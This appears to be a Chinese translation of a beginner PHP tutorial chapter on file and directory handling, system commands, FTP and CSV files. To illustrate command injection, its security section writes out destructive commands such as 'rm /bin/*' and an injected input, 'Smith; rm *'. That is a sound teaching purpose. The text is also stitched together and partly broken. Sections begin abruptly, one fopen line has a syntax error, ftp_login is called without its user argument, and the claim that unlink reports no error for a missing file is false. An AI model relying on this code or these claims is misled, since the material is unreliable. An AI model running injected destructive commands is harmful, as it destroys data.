  \ `fileold.txt` 复制到 `filenew.txt`。如果名为 `filenew.txt` 的文件已经存在，它将会被覆盖。如果你不想覆盖现有文件，可以使用以下语句防止这种情况：\n\
  \n```php\nIf(!file_exists(\"filenew.txt\"))\n{\n    copy(\"fileold.txt\",\"filenew.txt\"\
  );\n}\nelse\n{\n    echo \"File already exists!\\n\";\n}\n```\n\n你可以通过使用路径作为目标，将文件复制到不同的目录，如下：\n\
  \n```php\ncopy(\"fileold.txt\",\"newdir/filenew.txt\");\n```\n\n你可以使用 `rename` 语句来重命名文件，如下：\n\
  \n```php\nrename(\"oldname.txt\",\"newname.txt\");\n```\n\n如果你尝试将文件重命名为已存在的文件名，将显示如下警告，且文件不会被重命名：\n\
  \n```\nWarning: rename(fileold.txt,filenew.txt): File exists in c:test.php on line\
  \ 17\n```\n\n要删除不需要的文件，请使用 `unlink` 语句，如下：\n\n```php\nunlink(\"badfile.txt\");\n\
  ```\n\n执行该语句后，文件将被删除。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 如果文件原本不存在，`unlink`\
  \ 不会报错。它的行为和删除了文件完全一样。PHP 不会告诉你文件是否存在。因此，请注意拼写错误。\n\n## 管理文件\n\n文件被组织在目录（也称为文件夹）中。本节介绍了如何创建和删除目录，以及如何获取目录中的文件列表。\n\
  \n### 创建目录\n\n要创建一个目录，请使用 `mkdir` 函数，如下：\n\n```php\nmkdir(\"testdir\");\n```\n\n\
  该语句在脚本所在的目录中创建一个名为 `testdir` 的新目录。也就是说，如果脚本是 `/test/test.php`，那么新目录就是 `/test/testdir`。如果已存在相同的目录，将显示如下警告，且不会创建新目录：\n\
  \n```\nWarning: mkdir(): File exists in d:/test/test.php on line 5\n```\n\n你可以使用以下语句先检查目录是否已存在：\n\
  \n```php\nIf(!is_dir(\"mynewdir\"))\n{\n    mkdir(\"mynewdir\");\n}\nelse\n{\n \
  \   echo \"Directory already exists!\";\n}\n```\n\n创建目录后，你可以通过将文件复制到目录或移出目录来组织其内容。复制文件的描述在在本章较前的复制、重命名和删除文件\
  \ 节中。\n\n要在另一个目录中创建目录，请使用完整路径，如下：\n\n```php\nmkdir(\"/topdir/nextdir/mynewdir\"\
  );\n```\n\n你可以使用相对路径创建新目录，如下：\n\n```php\nmkdir(\"../mynewdir\");\n```\n\n使用该语句，如果你的脚本是\
  \ `/topdir/test/makedir.php`，那么新目录就是 `/topdir/mynewdir`。\n\n要切换到不同的目录，使用以下语句：\n\n\
  ```php\nchdir(\"../anotherdir\");\n```\n\n### 构建目录中所有文件的列表\n\n获取目录的文件列表通常很有用。例如，你可能想为用户提供下载文件列表，或者想显示特定目录中的图像。\n\
  \nPHP 提供了打开和读取目录的函数。要打开目录，使用 `opendir` 语句，如下：\n\n```php\n$dh = opendir(\"testdir/\"\
  );\n```\n\n执行该语句后，`$dh` 是指向目录的指针。要读取目录中的文件名，请使用 `readdir` 函数，如下：\n\n```php\nwhile($filename\
  \ = readdir($dh))\n{\n    echo $filename;\n}\n```\n\n`$filename` 变量包含文件名。注意 `readdir`\
  \ 无法控制读取文件的顺序。要关闭目录，使用 `closedir` 函数：\n\n```php\nclosedir($dh);\n```\n\n列表 3-1：一个创建图库的脚本\n\
  \n```php\n<?php\n/*\n * Script: displayGallery\n * Description: 显示目录中的所有图像。\n */\n\
  echo \"<html><head><title>Image Gallery</title></head><body>\";\n$dir = \"../testdir/\"\
  ;\n$dh = opendir($dir);\nwhile($filename = readdir($dh))\n{\n    $filepath = $dir.$filename;\n\
  \    if(is_file($filepath) && ereg(\"\\.jpg$/\",$filename))\n    {\n        $gallery[]\
  \ = $filepath;\n    }\n}\nclosedir($dh);\nsort($gallery);\nforeach($gallery as $image)\n\
  {\n    echo \"<hr />\";\n    echo \"<img src='$image' /><br />\";\n}\necho \"</body></html>\"\
  ;\n?>\n```\n\n注意列表 3-1 中某些行的行号：\n\n→8 行将目录存储在 `$dir` 中。注意目录名结尾包含了 `/`。\n\n→9 行打开目录。\n\
  \n→10 行启动 `while` 循环，读取目录中的每个文件名。\n\n→12 行创建变量 `$filepath`，即文件的路径。\n\n→13 行通过查找\
  \ `.jpg` 扩展名来检查文件是否为图形文件。如果文件具有 `.jpg` 扩展名，则将完整路径添加到名为 `$gallery` 的数组中。\n\n→16 行对数组进行排序，以便按字母顺序显示图像。\n\
  \n→17 行启动 `foreach` 循环，在网页中显示图像。\n\n\n\n\n\n在本节中，我们假设你已经了解你所操作系统的系统命令格式和用法。描述操作系统命令不在本书的涵盖范围内。如果你需要在\
  \ PHP 脚本中运行操作系统命令，本节将向你展示如何操作。\n\nPHP 允许你通过以下任何方法使用系统命令或运行其他语言编写的程序：\n\n-   反引号（backticks）：PHP\
  \ 执行两个反引号（`` ` ``）之间的系统命令并显示结果。\n-   `system` 函数：该函数执行系统命令，显示输出，并返回输出的最后一行。\n- \
  \  `exec` 函数：该函数执行系统命令，将输出存储在数组中，并返回输出的最后一行。\n-   `passthru` 函数：该函数执行系统命令并显示输出。\n\
  \n你可以执行任何可以在系统提示符中输入的命令。该命令将按原样执行。你可以执行简单的命令：如 `ls` 或 `dir`、`rename` 或 `mv`、`rm`\
  \ 或 `del`，但正如讨论过的，对于这些操作，使用 PHP 内置函数会更高效。\n\n如果你的操作系统允许管道或重定向输出，你就可以可以在 PHP 中执行的系统命令中使用管道或重定向。如果你的操作系统允许在同一行中输入两个命令，你就可以将两个命令放入从\
  \ PHP 中执行的单个命令中。以下示例命令在从 PHP 执行时是有效的，具体取决于操作系统：\n\n```\ndir\nrm badfile.txt\ndir\
  \ | sort\ncd c:\\php ; dir     (在 Windows 中无效)\n\"cd c:\\php && dir\"  (Windows)\n\
  dir > dirfile\nsort < unsortedfile.txt\n```\n\n在某些情况下，你想要运行一个需要长时间才能完成的系统命令。你可以在后台运行该系统命令（如果你的操作系统支持），同时让\
  \ PHP 继续执行脚本。如果你这样做，你需要将输出重定向到文件，而不是返回给脚本，这样 PHP 就可以在系统命令完成之前继续运行。\n\n接下来的章节将详细阐述上述方法。\n\
  \n## 使用反引号\n\n执行系统命令的一种简单方法是将命令放在两个反引号（`` ` ``）之间，如下所示：\n\n```php\n$result = `dir\
  \ c:\\php`;\n```\n\n变量 `$result` 包含语句的输出——在这种情况下是 `c:\\php` 目录下的文件列表。如果你 echo `$result`，将显示以下输出：\n\
  \n```\nVolume in drive C has no label.\nVolume Serial Number is 58B2-DBD6\nDirectory\
  \ of c:\\php\n10/10/2013  05:43 PM   <DIR>           .\n10/10/2013  05:43 PM   <DIR>\
  \           ..\n10/10/2013  04:53 PM   <DIR>           dev\n10/10/2013  04:53 PM\
  \   <DIR>           ext\n10/10/2013  04:53 PM   <DIR>           extras\n08/30/2013\
  \  07:11 AM             417,792 fdftk.dll\n... (other files omitted)\n180,664,549,376\
  \ bytes free\n```\n\n当启用 `safe_mode` 时，反引号操作将被禁用。在某些系统上，安装 PHP 时 `safe_mode` 默认设置为\
  \ `Off`。在其他系统上，`safe_mode` 被设置为 `On`。系统管理员可以更改此值。\n\n## 使用 system 函数\n\n`system`\
  \ 函数执行系统命令，显示输出，并返回系统命令输出的最后一行。要执行系统命令，请使用以下语句：\n\n```php\n$result = system(\"dir\
  \ c:\\php\");\n```\n\n当该语句执行时，会显示目录列表，并且 `$result` 包含命令输出的最后一行。如果你 echo `$result`，你将看到类似如下的内容：\n\
  \n```\n11 Dir(s)  566,263,808 bytes free\n```\n\n使用 `system` 函数的 `$result` 内容是 `dir`\
  \ 命令输出的最后一行。\n\n## 使用 exec 函数\n\n`exec` 函数执行系统命令但不显示输出。相反，输出可以存储在数组中，输出的每一行都成为数组中的一个元素。返回输出的最后一行。\n\
  \n也许你只是想知道目录中有多少文件和多少空闲字节。通过以下语句，你执行了命令而无需将输出保存到数组中：\n\n```php\n$result = exec(\"\
  dir c:\\php\");\n```\n\n命令执行了，但输出没有显示。变量 `$result` 包含输出的最后一行。如果你 echo `$result`，显示看起来如下：\n\
  \n```\n11 Dir(s)  566,263,808 bytes free\n```\n\n输出是 `dir` 命令输出的最后一行。如果你想将 `dir`\
  \ 命令的完整输出存储在数组中，请使用以下命令：\n\n```php\n$result = exec(\"dir c:\\php\",$dirout);\n```\n\
  \n在该语句执行后，数组 `$dirout` 包含目录列表，每个项目占一行。你可以如下所示显示目录列表：\n\n```php\nforeach($dirout\
  \ as $line)\n{\n    echo \"$line\\n\";\n}\n```\n\n循环显示如下内容：\n\n```\nVolume in drive\
  \ C has no label.\nVolume Serial Number is 394E-15E5\nDirectory of c:\\php\n10/10/2013\
  \  05:43 PM   <DIR>           .\n10/10/2013  05:43 PM   <DIR>           ..\n10/10/2013\
  \  04:53 PM   <DIR>           dev\n10/10/2013  04:53 PM   <DIR>           ext\n\
  10/10/2013  04:53 PM   <DIR>           extras\n... (other files)\n```\n\n你也可以使用以下语句从输出数组中获取特定元素：\n\
  \n```php\necho $dirout[3];\necho $dirout[7];\n```\n\n输出如下：\n\n```\nDirectory of\
  \ C:\\PHP\n10/10/2013  04:53 PM   <DIR>           dev\n```\n\n## 使用 passthru 函数\n\
  \n`passthru` 函数执行系统命令并按返回的形式显示输出。要执行系统命令，请使用以下语句：\n\n```php\npassthru(\"dir c:\\\
  php\");\n```\n\n该语句显示目录列表，但不返回任何内容。因此，你不需要使用变量来存储返回的数据。\n\n\n\n\n输出以原始形式显示；不会经过任何处理。因此，当预期二进制输出时，可以使用此函数。\n\
  \n### 获取来自系统命令的错误消息\n\n执行系统命令的方法在系统命令失败时，不会显示或返回信息性的错误消息。你之所以知道系统命令没有执行，是因为你没有得到预期的结果。但由于这些函数没有返回错误消息，你并不知道到底出了什么问题。\n\
  \n你可以通过在正在执行的系统命令后添加几个额外的字符，来返回或显示操作系统的错误消息。在大多数操作系统上，如果你在系统命令后添加字符 `2>&1`，错误消息将发送到输出重定向的地方。例如，你可以使用以下语句：\n\
  \n```php\n$result = system(\"di c:\\php\");\n```\n\n当系统命令执行时，`system` 函数会显示目录。但是，注意\
  \ `dir` 被拼写错了。应该是 `di` 而不是 `dir`。不存在名为 `di` 的系统命令，因此系统命令无法执行，什么也没有显示。假设你改用了以下语句：\n\
  \n```bash\n$result = system(\"di c:\\php 2>&1\");\n```\n\n在这种情况下，错误消息被显示出来。在 Windows\
  \ 上，显示的错误消息如下：\n\n```\n'di' 不是内部或外部命令、可运行的程序或批文件。\n```\n\n![remember.eps](img/remember_fmt.png)\
  \ 请务必不要在 `2>&1` 中包含任何空格。该格式要求字符连在一起，不能有空格。\n\n### 理解安全问题\n\n当你执行系统命令时，你允许用户在你的计算机上执行某种操作。如果系统命令是\
  \ `dir c:\\php`，那是没问题的。但如果系统命令是 `rm /bin/*` 或 `del c:\\*.*`，你将对结果感到不满。在使用脚本之外执行系统命令的函数时，你需要小心。\n\
  \n![remember.eps](img/remember_fmt.png) 只要你只执行自己编写的命令（例如 `dir` 或 `ls`），你就是安全的。但当你开始执行包含用户发送数据的命令时，你需要极其小心。例如，假设你有一个应用程序，用户在表单中输入名称，然后你的应用程序根据用户发送的名称创建一个目录。用户在名为\
  \ `directoryName` 的表单字段中输入了 `Smith`。你处理表单的脚本有如下命令：\n\n```php\n$directoryName = $_POST['directoryName'];\n\
  exec(\"mkdir $directoryName\");\n```\n\n由于 `$directoryName = Smith`，执行的系统命令是 `mkdir\
  \ Smith`。目录被创建，大家都很开心。\n\n然而，假设用户在表单中输入了 `Smith; rm *`。在这种情况下，`$directoryName =Smith;rm\
  \ *`。现在执行的系统命令是 `mkdir Smith;rm *`。在许多操作系统（如 Unix 和 Linux）中，分号字符分隔两个命令，以便在一行内输入两个命令。哎呀！命令的执行情况如下：\n\
  \n```bash\nmkdir Smith\nrm *\n```\n\n现在你面临问题了。`Smith` 目录被创建，当前目录下的所有文件都被删除了。\n\n\
  如果你在系统命令中使用变量，必须谨慎地使用它。你必须知道它从哪里来。如果它来自脚本外部，你需要在使用该变量之前检查变量中的值。在前面的示例中，你可以添加代码，让脚本在\
  \ `mkdir` 命令中使用变量之前进行检查，确保它只包含字母和数字。（本微型书籍的 第 2 章 描述了如何使用 `if` 语句执行此类检查。）\n\n##\
  \ 使用 FTP\n\n从一台计算机传输文件到另一台计算机在互联网上每天发生数百万次。当身处两地的同事需要共享文件时，这不是问题。快速传输只需要几秒钟，所有方都得到了所需的文件。\n\
  \n文件传输协议（FTP）是从一台计算机传输文件到另一台计算机的常用方法。FTP 允许你从另一台计算机获取目录列表，或者一次下载或上传多个文件。\n\nFTP\
  \ 是客户端/服务器软件。要使用 FTP 在你的计算机和远程计算机之间传输文件，你需要连接到远程计算机上的 FTP 服务器并向其发送请求。\n\n值得注意的是，FTP\
  \ 本质上是不安全的，而且这不是通过治疗可以解决的。当你使用 FTP 时，你的用户名、密码以及文件本身都会以未加密的形式通过网络传输。这意味着具有足够知识和网络访问权限的人可以“嗅探”用户名和密码。如果你正在寻找更安全的文件传输方法，请查看\
  \ SCP 或 SFTP 命令。尽管如此，FTP 仍然被广泛使用，特别是对于托管提供商。\n\n要在脚本中使用 FTP，在安装 PHP 时需要启用 FTP 支持。如果你为\
  \ Windows 安装了 PHP，你就不需要执行任何额外操作来启用 FTP 支持。如果你在 Unix、Linux 或 Mac 上编译 PHP 并想启用 FTP\
  \ 支持，可以使用 FTP 支持安装选项，如下所示：\n\n```bash\n--enable-ftp\n```\n\n在本节中，我们将告诉你关于登录 FTP\
  \ 服务器、访问目录列表、在 FTP 服务器之间双向传输文件，以及使用各种函数完成与 FTP 相关的任务所需要的的知识。\n\n#### 登录 FTP 服务器\n\
  \n要连接到你想要交换文件的计算机上的 FTP 服务器，请使用 `ftp_connect` 函数：\n\n```php\n$connect = ftp_connect(\"\
  janet.valade.com\");\n```\n\n或者，你可以使用 IP 地址连接：\n\n```php\n$connect = ftp_connect(\"\
  172.204.2\");\n```\n\n连接后，你必须登录服务器。你需要用户 ID 和密码来登录。你可能有自己的账户 ID 和密码，也可能使用通用的 ID。互联网上的某些公共站点允许使用\
  \ `anonymous` 作为 ID 并将电子邮件地址作为密码进行登录。为了安全，最好将用户 ID 和密码存放在单独的文件中并在需要时包含它。\n\n`ftp_login`\
  \ 函数允许你在建立连接后登录。此语句假设你的账户 ID 和密码存储在变量中：\n\n```php\n$login_result = ftp_login($connect,$passwd);\n\
  ```\n\n如果你在建立连接之前尝试登录，会看到以下警告：\n\n```\nWarning: ftp_login() expects parameter 1\
  \ to be resource, boolean given in d:\\test1\\test13.php on line 9\n```\n\n警告并没有停止程序。登录失败了，但脚本继续执行，这可能不是你想要的。由于脚本的后续部分取决于你的\
  \ FTP 连接，你可能需要在函数失败时停止脚本。以下语句会在函数失败时停止脚本：\n\n```php\n$connect = ftp_connect(\"janet.valade.com\"\
  ) or die(\"无法连接到服务器\");\n$login_result = ftp_login($connect,$passwd) or die(\"无法登录服务器\"\
  );\n```\n\n登录 FTP 服务器后，你可以向其发送请求以完成任务，例如获取目录列表或上传和下载文件，见下文。\n\n##### 获取目录列表\n\n\
  一个常见的任务是获取目录列表。`ftp_nlist` 语句从远程计算机获取目录列表并将其存储在数组中，如下：\n\n```php\n$filesArr = ftp_nlist($connect,\"\
  data\");\n```\n\n括号中的第二个参数是目录名称。如果你不知道目录名称，可以请求 FTP 服务器向你发送当前目录的名称，如下：\n\n```php\n\
  $directory_name = ftp_pwd($connect);\n$filesArr = ftp_nlist($connect,$directory_name);\n\
  ```\n\n\n\n在 `ftp_nlist` 语句执行后，FTP 发出的目录列表存储在一个数组中，数组的每个元素包含一个文件名。你可以如下所示从数组中显示目录列表：\n\
  \n```php\nforeach($filesArr as $value)\n{\n    echo \"$value\\n\";\n}\n```\n\n##\
  \ 使用 FTP 下载和上传文件\n\n你可以使用 `ftp_get` 函数从远程计算机下载文件。在登录 FTP 服务器后，以下语句将从远程计算机下载文件：\n\
  \n```php\nftp_get($connect,\"newfile.txt\",\"data.txt\",FTP_ASCII);\n```\n\n第一个文件名\
  \ `newfile.txt` 是文件在下载到你的计算机后将拥名称。第二个文件名 `data.txt`是你想要下载的文件的现有名称。\n\n语句中的 `FTP_ASCII`\
  \ 术告诉 FTP 正在下载的是什么类型的文件。以下是文件模式的选择：\n\n- ![check](img/check.png) `FTP_ASCII`: 这些是文本文件。\n\
  - ![check](img/check.png) `FTP_BINARY`: 机器语言文件，基本上是任何非纯文本的内容。\n- ![tip.eps](img/tip_fmt.png)\
  \ 你可以通过检查文件内容来确定需要哪种文件模式。如果内容是可以读取和理解的字符，则文件是 ASCII。如果内容看起来像乱码，则文件是二进制的。例如，图形文件就是二进制文件。\n\
  \n你可以使用名为 `ftp_put` 的相似函数上传文件。以下语句上传文件：\n\n```php\nftp_put($connect,\"newfile.txt\"\
  ,\"data.txt\",FTP_ASCII);\n```\n\n第一个文件名 `newfile.txt` 是文件在上传到远程计算机后将拥有的名称。第二个文件名\
  \ `data.txt`是你想要上传的文件现有名称。\n\n当你完成通过 FTP 连接传输文件后，可以使用以下语句关闭连接：\n\n```php\nftp_close($connect);\n\
  ```\n\nListing 3-2 中的脚本下载目录中所有具有 `.txt` 扩展的文件。这些文件通过 FTP 连接从远程计算机下载。\n\n### 列表 3-2：一个通过\
  \ FTP 下载文件的脚本\n\n```php\n<?php\n/* Script name: downloadFiles\n  * Description:\
  \ Downloads all the files with a .txt\n  *              extension in a directory\
  \ via FTP.\n  */\ninclude(\"ftpstuff.inc\");\n$dir_name = \"data/\";\n$connect =\
  \ ftp_connect($servername)\n    or die(\"Can't connect to FTP server\");\n$login_result\
  \ = ftp_login($connect,$userID,$passwd)\n    or die(\"Can't log in\");\n$filesArr\
  \ = ftp_nlist($connect,$dir_name);\nforeach($filesArr as $value)\n{\n    if(preg_match(\"\
  #\\.txt$#\",$value))\n    {\n        if(!file_exists($value))\n        {\n     \
  \       ftp_get($connect,$value,$dir_name.$value,FTP_ASCII);\n        }\n      \
  \  else\n        {\n            echo \"File $value already exists!\\n\";\n     \
  \   }\n    }\n}\nftp_close($connect);\n?>\n```\n\n该脚本从远程计算机获取目录列表并存储在 `$filesArr`\
  \ 中。`foreach` 语句遍历 `$filesArr` 中的文件名，并检查每个文件是否具有 `.txt` 扩展名。当文件具有 `.txt` 扩展名时，脚本会测试本地计算机上已存在同名文件。如果不存在该同名文件，则下载该文件；如果存在该文件，则打印消息且不下载该文件。\n\
  \nListing 3-2 中的脚本包含一个名为 `ftpstuff.inc` 的文件。该文件包含通过 FTP 连接到服务器所需的信息。`ftpstuff.inc`\
  \ 文件包含类似下面的代码：\n\n```php\n<?php\n  $servername = \"yourserver\";\n  $userID = \"\
  youruserid\";\n  $passwd = \"yourpassword\";\n?>\n```\n\n\n\n\n\n| 模式 | 说明 | 备注\
  \ |\n| :--- | :--- | :--- |\n| `a` | 在文件末尾追加数据。 | PHP 尝试创建它。 |\n| `a+` | 读取和追加。\
  \ | PHP 尝试创建它。 |\n\n![remember.eps](img/remember_fmt.png) 文件名可以是简单的文件名 (`filename.txt`)、文件路径\
  \ (`c:/data/filename.txt`) 或 URL (`http://yoursite.com/filename.txt`)。\n\n## 以只读模式打开文件\n\
  \n你可以使用以下语句打开文件 `file1.txt` 并读取文件中的信息：\n\n```php\n$fh = fopen(\"file1.txt\", \"\
  r\");\n```\n\n根据该语句，PHP 在当前目录中查找 `file1.txt`，该目录就是你的 PHP 脚本所在的目录。如果找不到该文件，可能会或不会显示类似所示的警告信息，这取决于所设置的错误级别，详见本微型书籍的第\
  \ 1 章：\n\n```text\nWarning: fopen(file1.txt): failed to open stream: No such file\
  \ or directory in d:\\test2.php on line 15\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 记住，警告条件不会停止脚本。脚本会继续运行，但文件不会打开，因此后续任何读取或写入该文件的语句都不会执行。\n\n你可能希望在文件无法打开时停止脚本。你需要通过\
  \ `die` 语句手动实现这一点，如下：\n\n```php\n$fh = fopen(\"file1.txt\", \"r\")\n     or die(\"\
  Can't open file\");\n```\n\n`die` 语句会停止脚本并显示指定的消息。\n\n## 以写入模式打开文件\n\n你可以使用以下类型的语句在指定的目录中打开一个文件以存储信息：\n\
  \n```php\n$fh = fopen(\"c:/testdir/file1.txt\", \"w\");\n```\n\n如果文件不存在，它将在指定的目录中创建。然而，如果目录不存在，则不会创建目录，并会显示警告。（你必须在尝试向该目录写入文件之前先创建目录。）\n\
  \n你可以在尝试向目录写入文件之前，使用以下语句检查目录是否存在：\n\n```php\nIf(is_dir(\"c:/tester\"))\n{\n    $fh\
  \ = fopen(\"c:/testdir/file1.txt\", \"w\");\n}\n```\n\n通过这些语句，只有当路径/文件名存在且是一个目录时，`fopen`\
  \ 语句才会执行。\n\n## 打开另一个网站上的文件\n\n你也可以使用类似下面的语句打开另一个网站上的文件：\n\n```php\n$fh = fopen(\"\
  http://janet.valade.com/index.html\", \"r\");\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ 你只能在只读模式下使用 URL，而不是写入模式，而且有更好的方法可以这一点——即 cURL 函数。有关 cURL 函数的更多信息，请参阅 http://php.net/manual/en/book.curl.php\
  \  PHP 手册。\n\n## 关闭文件\n\n在完成对文件的读取或写入后，使用以下语句关闭文件：\n\n```php\nfclose($fh);\n```\n\
  \n在该语句中，$fh` 是你在打开文件时创建的文件句柄变量。\n\n## 写入文件\n\n打开文件后，你可以使用 `fwrite` 语句写入内容，其通用格式如下：\n\
  \n```php\nfwrite($fh, \"datatosave\");\n```\n\n在该语句中，$fh` 是你打开包含目标的文件时创建的文件句柄，它包含指向打开文件的指针；`datatosave`\
  \ 是要存储在文件中的信息。信息可以是字符串或变量。例如，你可以使用以下语句：\n\n```php\n$today = date(\"Y-m-d\");\n$fh\
  \ = fopen(\"file2.txt\", \"a\");\nfwrite($fh, \"$today\\n\");\nfclose($fh);\n```\n\
  \n这些语句将当前日期存储在名为 `file2.txt` 的文件中。注意文件是以追加模式 (`a`) 打开的。如果文件不存在，则会创建它并将日期作为第一行写入。如果文件存在，则将日期添加到文件末尾。通过这种方式，你创建了一个存储脚本运行日期的日志文件。`fwrite`\
  \ 语句会精确存储你发送的内容。在 `fwrite` 语句执行两次后，`file2.txt` 包含：\n\n```text\n2013-10-22\n2013-10-22\n\
  ```\n\n日期出现在不同的行中，是因为换行符 (`\\n`) 被写入了文件。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 如果你想向文件中添加信息，请务必使用 `a` 模式打开文件。如果你使用写入模式，文件每次打开时都会被覆盖。\n\n## 从文件中读取\n\n你可以使用 `fgets`\
  \ 语句从文件中读取，其通用格式如下：\n\n```php\n$line = fgets($fh)\n```\n\n在该语句中，$fh` 是你打开文件时创建的文件句柄。`fgets`\
  \ 从文件中读取一行，直到到达文件末尾、换行符或指定的字节数。\n\n有时你想分段读取文件。你可以通过以下方式告诉 `fgets` 读取指定数量的字节：\n\n\
  ```php\n$line = fgets($fh, n)\n```\n\n该语句告诉 PHP 读取长度为 `n` 的字符串直到到达文件末尾。例如，你可以使用以下语句：\n\
  \n```php\nwhile(!feof($fh))\n{\n    $char4 = fgets($fh, 5);\n    echo \"$char4\\\
  n\";\n}\n```\n\n这些语句读取五个字符的字符串直到文件末尾。输出为：\n\n```text\n2013\n-10-\n22\n2013\n-10-\n\
  22\n```\n\n注意每行末尾都有换行符。`feof` 在到达文件结束时返回 true。\n\n## 读取到数组\n\n将整个文件放入数组通常非常方便。你可以通过以下语句实现：\n\
  \n```php\n$fh = fopen(\"file2.txt\", \"r\");\nwhile(!feof($fh))\n{\n    $content[]\
  \ = fgets($fh);\n}\nfclose($fh);\n```\n\n结果是数组 `$content`，文件的每一行都是数组的一个元素。数组键是数字。\n\
  \nPHP 提供了一个快捷函数可以打开文件并将整个内容读取到数组，每个元素一行。以下语句与之前的五行相同：\n\n```php\n$content = file(\"\
  file2.txt\");\n```\n\n该语句打开 `file2.txt`，将每行放入数组 `$content` 的元素中，然后关闭文件。\n\n如果你打开的文件非常，`file`\
  \ 函数可能会降低脚本速度。这取决于可用计算机内存。如果你的脚本运行很慢，尝试使用 `fgets` 而不是 `file` 来读取文件，看看是否能加快脚本运行。\n\
  \n你可以使用以下语句引导 `file` 函数自动打开位于 `include` 目录（本微型书籍的第 2 章;\n```\n\n\n\n\n\n# 将文件读取到字符串\n\
  \n有时，将文件的整个内容放入一个长字符串中是非常有用的。例如，你可能想在电子邮件中发送文件内容。PHP 了一个用于将文件读取到字符串的函数，如下所示：\n\n\
  ```php\n$content = file_get_contents(\"file2.txt\",1);\n```\n\n`file_get_contents`\
  \ 函数的工作方式与 `file` 函数相同，不同之处在于将文件的整个内容放入字符串中，而不是数组。执行此语句后，你可以按照如下方式输出 `$content`：\n\
  \n```php\necho $content;\n```\n\n输出如下：\n\n```\n2013-10-22\n2013-10-22\n```\n\n输出显示在不同的行上，这是因为换行符被读取并存储为字符串的一部分。因此，当你输出该字符串时，你也输出了换行符，而换行符会开启新行。\n\
  \n![warning_bomb.eps](img/warning_bomb_fmt.png) `file_get_contents` 函数是在 4.3.0 版本中引入的。在旧版本的\
  \ PHP 中并不可用。\n\n## 与其他程序交换数据\n\n你有时可能向其他程序提供信息，或从其他程序向 PHP 读取信息。平面文件（Flat files）对于此类任务特别有用，我们在这里将解释如何执行这类任务。\n\
  \n## 在平面文件中交换数据\n\n几乎所有的软件都具有从平面文件中读取信息或向平面文件中写入信息的能力。例如，默认情况下，你的文字处理器以自己的格式保存文档，这种格式只有文字处理器才能理解。然而，你可以选择以文本格式保存文档。文本文档是包含文本的平面文件，文本可以被其他软件读取。你的文字处理器也可以读取文本文件，即使是由其他软件编写的文件。\n\
  \n当你的 PHP 脚本将信息保存到文本文件中，任何具有读取文本文件的软件都可以读取这些信息。例如，大多数文字处理软件都可以读取文本文件。然而，某些软件要求文本文件具有特定格式。例如，地址簿软件应用程序可能从平面文件中读取数据，但要求信息位于指定的位置——例如，一行的前\
  \ 20 个字符读取为名称，接下来的 20 个字符读取为街道地址，依此类推。你需要知道软件对平面文件要求的格式。然后，在本章前面的部分讨论的写入文件中，使用 `fwrite`\
  \ 语句在你的 PHP 脚本以正确的格式写入平面文件。\n\n## 以逗号分隔格式交换数据\n\n逗号分隔值（CSV）文件——也称为逗号分隔文件——是一种在软件程序之间传输信息的常用格式。\n\
  \n### 理解逗号分隔格式\n\nCSV 文件用于传输可以结构化表格、按行和列组织的信息。例如，电子表格程序按行和列组织数据并可以读写 CSV 文件。CSV\
  \ 文件经常用于在不同的数据库软件之间传输数据，例如在 `MySQL` 和 `Microsoft Access` 之间。许多其他软件程序也可以读取和写入 CSV\
  \ 文件中的数据。\n\nCSV 文件的组织方式是表格的每一行在文件中单独占一行，行中的列之间用逗号分隔。例如，地址簿可以如下所示组织为 CSV 文件：\n\n\
  ```\nJohn Smith,121234 Oak St.,Big City,OR,99999\nMary Jones,5678 Pine St.,Bigger\
  \ City,ME,11111\nLuis Rojas,1234 Elm St.,Biggest City,TX,88888\n```\n\nExcel 可以将此文件读取为具有五列的表格。逗号表示一列的结束和下一列的开始。\n\
  \n### 创建逗号分隔文件\n\n以下 PHP 语句创建 CSV 文件：\n\n```php\n$address[] = \"John Smith,1234\
  \ Oak St.,Big City,OR,99999\";\n$address[] = \"Mary Jones,5678 Pine St.,Bigger City,ME,11111\"\
  ;\n$address[] = \"Luis Rojas,1234 Elm St.,Biggest City,TX,88888\";\n$fh = fopen(\"\
  addressbook.txt\",\"a\");\nfor ($i=0;$i<3;$i++)\n{\n    fwrite($fh,$address[$i].\"\
  \\n\");\n}\nfclose($fh);\n```\n\n### 读取逗号分隔文件\n\nPHP 可以使用 `file` 或 `fgets` 函数来读取\
  \ CSV 文件，正如在本章前面的将文件读取到数组部分所述的。然而，PHP 提供了一个名为 `fgetcsv` 的函数，专门为读取 CSV 文件而设计。当你使用此函数读取\
  \ CSV 文件中的某行时，该行存储在数组中，每个列项都是数组中的一个元素。例如，你可以使用该函数读取地址簿 CSV 文件的第一行，如下：\n\n```php\n\
  $address = fgetcsv($fh,1000);\n```\n\n在此语句中，`$fh` 是文件句柄，1000 是读取的字符数。\n\n```php\n\
  <?php\n$myfile = \"testing\";\n/* 脚本名称：将 CSV 文件转换为制表文件\n * 说明：读取 CSV 文件并输出制表分隔文件。CSV\
  \ 文件必须具有 .csv 扩展名。\n */\nfunction convert($filename) {\n    if(@fh_in = fopen(\"\
  {$filename}.csv\",\"r\")) {\n        $fh_out = fopen(\"{$filename}.tsv\",\"a\");\n\
  \        while(!feof($fh_in)) {\n            $line = fgetcsv($fh_in,1024);\n   \
  \         if($line[0] == \"\") {\n                fwrite($fh_out,\"\\n\");\n   \
  \         } else {\n                fwrite($fh_out,implode($line,\"\\t\").\"\\n\"\
  );\n            }\n        }\n        fclose($fh_in);\n        fclose($fh_out);\n\
  \    } else {\n        echo \"文件不存在\\n\";\n        return false;\n    }\n    echo\
  \ \"转换完成!\\n\";\n    return true;\n}\nconvert($myfile);\n?>\n```\n\n以下点引用了列表 3-3\
  \ 中的行号：\n\n→7 定义了文件名为 `testing`。\n\n→8 定义了一个名为 `convert()` 的函数，带有一个参数 `$filename`。\n\
  \n→10 打开了传递给函数的带有 `.csv` 扩展名的文件名。该文件以读取模式打开。如果文件打开成功，则执行 `if` 块中的转换语句。如果找不到文件，则执行从第\
  \ 27 行开始的 `else` 块。\n\n\n\n\n→12 这一行打开一个文件，文件名是传递给函数并带有 `.tsv` 扩展的文件。文件以追加模式打开。该文件位于脚本的当前目录。如果文件位于另一个目录，且你认为文件可能无法以写入模式打开，请在此处使用\
  \ `if` 语句测试文件是否已打开，如果没有打开则执行某些操作。\n\n→13 这一行启动了一个 `while` 循环，一直持续到文件结束。\n\n→15 这条语句从输入文件中读取一行到数组\
